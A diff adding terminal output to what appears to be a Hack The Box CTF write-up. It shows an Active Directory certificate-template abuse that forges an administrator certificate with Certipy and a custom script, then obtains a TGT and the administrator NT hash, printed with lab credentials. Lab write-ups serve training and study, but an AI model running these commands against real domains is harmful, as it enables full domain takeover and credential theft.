@@ -1908,3 +1908,70 @@ Signature = "$Windows NT$"
 CertUtil: -dsTemplate command completed successfully.
 
 ```
+
+``` bash
+
+❯ python3 create_template.py -H dc.danglingtree.htb -u 'jake.h@danglingtree.htb' -p 'Password123!' -t EmployeeAuthTemplate
+[+] OID:      1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174.1.403
+[+] OID DN:   CN=403.3152B6C9AE5CABF7014690E4CAE8E9BD,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
+[+] Template: CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
+[+] Authenticated Users received full control
+
+```
+
+``` bash
+❯ certipy-ad template -u 'jake.h@danglingtree.htb' -p 'Password123!' -dc-ip 10.129.82.118 -dc-host dc.danglingtree.htb -template EmployeeAuthTemplate -write-default-configuration S-1-5-11 -no-save -force
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Updating certificate template 'EmployeeAuthTemplate'
+[*] Adding:
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9cD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x00\x00\x14\x00\x94\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
+[*]     flags: 66104
+[*] Successfully updated 'EmployeeAuthTemplate'
+
+```
+
+
+``` bash
+
+
+❯ certipy-ad req -u 'jake.h@danglingtree.htb' -p 'Password123!' -dc-ip 10.129.82.118 -dc-host dc.danglingtree.htb -ca danglingtree-DC-CA -template EmployeeAuthTemplate -upn 'administrator@danglingtree.htb' -sid 'S-1-5-21-4220238332-57023728-1129110646-500' -dynamic-endpoint -out administrator.pfx
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 18
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@danglingtree.htb'
+[*] Certificate object SID is 'S-1-5-21-4220238332-57023728-1129110646-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+❯ sudo ntpdate -u dc.danglingtree.htb
+2026-08-27 11:58:01.686747 (+0200) +49.578686 +/- 0.018389 dc.danglingtree.htb 10.129.82.118 s1 no-leap
+CLOCK: time stepped by 49.578686
+
+```
+
+``` bash
+
+
+❯ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.82.118 -domain danglingtree.htb -username administrator
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@danglingtree.htb'
+[*]     SAN URL SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
+[*]     Security Extension SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
+[*] Using principal: 'administrator@danglingtree.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
+╭─ ~/hacking/ctf/htb/medium/danglintree/scripts                                                      ✔ │ 4s ─╮
+╰─                                                                                                          ─╯
+
+```
